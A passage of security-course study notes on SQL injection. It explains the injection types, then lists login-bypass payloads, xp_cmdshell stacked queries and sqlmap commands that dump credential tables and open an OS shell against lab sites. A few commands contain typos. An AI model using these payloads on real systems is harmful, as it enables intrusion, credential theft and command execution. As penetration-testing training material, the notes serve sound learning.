# 15 - SQL Injection

#### <mark style="color:yellow;">**Module 15 - SQL Injection**</mark>

<details>

<summary>What is SQL Injection?</summary>

**SQL Injection** is a type of security vulnerability that occurs when an attacker is able to manipulate an SQL query in a way that it executes unintended commands on a database. This can lead to unauthorized access, data disclosure, data manipulation, or even database destruction.

Here's a basic textual explanation:

**1. SQL Query:** In web applications, databases are often used to store and retrieve data. The application sends SQL queries to the database to interact with the data.

**2. User Input:** User input is data that a user provides to a web application, like a search query in a text box or a login form.

**3. Vulnerability:** In a vulnerable application, the SQL query is constructed by simply including the user's input without proper validation or sanitization.

**4. Attack:** An attacker can enter malicious input, which may include SQL code, into the user input fields. If the application doesn't properly validate and sanitize this input, the attacker's SQL code becomes part of the query sent to the database.

**5. Exploitation:** The attacker can manipulate the SQL query to perform malicious actions, such as extracting sensitive data, modifying or deleting data, or even taking control of the database.



</details>

<div align="left">

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption><p><a href="https://spanning.com/blog/sql-injection-attacks-web-based-application-security-part-4/">https://spanning.com/blog/sql-injection-attacks-web-based-application-security-part-4/</a></p></figcaption></figure>

</div>

<details>

<summary>Type of SQL Injection</summary>

### Types of SQL Injection

**Union-based SQL**i: This technique involves using the UNION SQL operator to combine the results of the original query with the results of an attacker-controlled query.

**Error-based SQL**i: This technique involves forcing the database to generate an error, which can reveal information about the database structure.

**Blind SQLi**: In this type of SQLi, the attacker doesn't get the results of the SQL query in the HTTP response. The attacker has to send a payload, and based on the application's response, he can infer if the payload was executed successfully or not.

**Time-based Blind SQLi**: This is a type of blind SQLi where the attacker can infer if the payload was executed successfully or not based on the time the server takes to respond.

**Out-of-Band SQLi**: In this type of SQLi, the attacker doesn't get the results of the SQL query in the HTTP response. Instead, the results are sent to an external server controlled by the attacker.

**Second Order SQLi**: In this type of SQLi, the payload is not directly injected into the SQL query, but it is stored by the application and used in a later SQL query.

**Stored Procedure Attacks**: This involves calling stored procedures from the SQL injection point.

**Function Call Payloads**: This involves calling database functions from the SQL injection point.

**Boolean-based SQLi**: This involves sending a SQL query that will return a different result depending on whether the condition in the query is true or false.

**Content-based SQLi**: This involves sending a SQL query that will return a different result depending on the content of the HTTP response.

</details>

## Manual Injection

* `‘ or 1=1 --`  for login bypass
* admin' --
* admin' #
* admin'/\*
* ' or 1=1--
* ' or 1=1#
* ' or 1=1/\*
* ') or '1'='1--
* ') or ('1'='1—
* `‘insert into login values ('john','apple123'); --` create own user in the database
* `‘create database mydatabase; --`  create database with name of mydatabase
* `‘exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --` execute ping on moviescope

## SQLMap

* Open the vulnerable website
* Copy the cookie from the inspect element
* Open the terminal and run SQLMap

### Basic Commands

* SQLMAP Extract DBS
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="xookies xxx" --dbs`
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="xookies xxx" --data="id=1&Submit=Submit"--dbs`
* Extract Tables
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" -D moviescope --tables`
* Extract Columns
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" -D moviescope -T User_Login --columns`
* Dump Data
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" -D moviescope -T User_Login --dump`
* OS Shell to execute commands
  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" --os-shell`
* Login bypass
  * `blah' or 1=1 --`
* Insert data into DB from login
  * `blah';insert into login values ('john','apple123');`
* Create database from login
  * `blah';create database mydatabase;`
* Execute cmd from login
  * `blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --`

### **Perform an SQL Injection Attack Against MSSQL to Extract Databases using SQLMap**

* Login a website
* Inspect element
* Dev tools-\&gt;Console: document.cookie
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" –dbs**
  * **-u: Specify the target URL**
  * **--cookie: Specify the HTTP cookie header value**
  * **--dbs: Enumerate DBMS databases**
* Get a list of databases
* Select a database to extract its tables
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" -D moviescope –tables**
  * **-D: Specify the DBMS database to enumerate**
  * **--tables: Enumerate DBMS database tables**
* Get a list of tables
* Select a column
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" -D moviescope –T User\_Login --dump**
* Get table data of this column
* **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" --os-shell**
* Get the OS Shell
* TASKLIST

Then, if we've SQL username and psw, we can use them to login and query db.

```bash
mysql -U qdpmadmin -h 192.168.1.8 -P passwod
show databases;
use qdpm;
show tables' select * from users;
show dtabases;
use staff;
show tables;
select * from login;
select * from user;
```

## Other Tools

* **Havij**: Havij is an automated SQL Injection tool that helps penetration testers to find and exploit SQL Injection vulnerabilities.
* **jSQL Injection**: jSQL Injection is a lightweight application used to find database information from a distant server.
* **BBQSQL**: BBQSQL is a blind SQL injection framework written in Python.
* **NoSQLMap**: NoSQLMap is an open-source Python tool designed to audit for as well as automate injection attacks and exploit default configuration weaknesses in NoSQL databases.
* **SQLNinja**: SQLNinja is a tool to exploit SQL Injection vulnerabilities on a web application that uses Microsoft SQL Server as its back-end.
* **SQLiX**: SQLiX is a SQL Injection scanner written in Perl.
* **SQLSentinel**: SQLSentinel is an application-level firewall for MySQL that prevents SQL Injection attacks.
* **MyBatis**: MyBatis is a Java persistence framework that includes a built-in SQL Injection scanner.
* **Blisqy**: Blisqy is a tool to aid Web Security researchers to find Time-based Blind SQL injection on HTTP Headers and also exploitation of the same vulnerability.

## Lab - Example of use

### **SQLMap**

site:[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/) php?= (for finding vulnerable site)

(for cookies- console->document.cookie)

&#x20;

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  --dbs   (databases)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart –tables   (tables)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users --columns   (columns)

(dump whole table)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users  --dump  &#x20;

&#x20;                                                           OR                                                                                   &#x20;

(dump individual  column data)

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C uname  --dump &#x20;

sqlmap -u [http://testphp.vulnweb.com/artists.php?artist=1](http://testphp.vulnweb.com/artists.php?artist=1)  -D acuart -T users -C pass  --dump

## Additional Resources

{% embed url="https://hackertarget.com/sqlmap-tutorial/" %}

{% embed url="https://www.binarytides.com/sqlmap-hacking-tutorial/" %}

{% embed url="https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/" %}

{% embed url="https://medium.com/@rafaelrenovaci/dvwa-solution-sql-injection-blind-sqlmap-cd1461ad336e" %}

{% embed url="https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7" %}

{% embed url="https://gracefulsecurity.com/sql-injection-filter-evasion-with-sqlmap/" %}

{% embed url="https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3" %}

{% embed url="https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF" %}

{% embed url="https://www.1337pwn.com/use-sqlmap-to-bypass-cloudflare-waf-and-hack-website-with-sql-injection/" %}

[https://www.youtube.com/watch?v=IR1JsaSQLMc](https://www.youtube.com/watch?v=IR1JsaSQLMc)
